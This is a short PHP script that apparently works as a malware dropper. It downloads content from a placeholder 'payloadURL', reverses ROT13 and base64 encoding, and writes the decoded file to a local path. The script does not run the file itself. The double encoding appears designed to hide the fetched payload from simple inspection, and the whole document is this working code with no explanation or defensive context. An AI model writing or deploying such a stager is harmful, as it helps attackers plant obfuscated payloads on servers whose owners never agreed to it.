<?php
    $url  = 'payloadURL';
    $path = './destinationName';
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($ch);
    curl_close($ch);
    $rotatedText = str_rot13($data);
    $decodedText = base64_decode($rotatedText);
    file_put_contents($path, $decodedText);
?>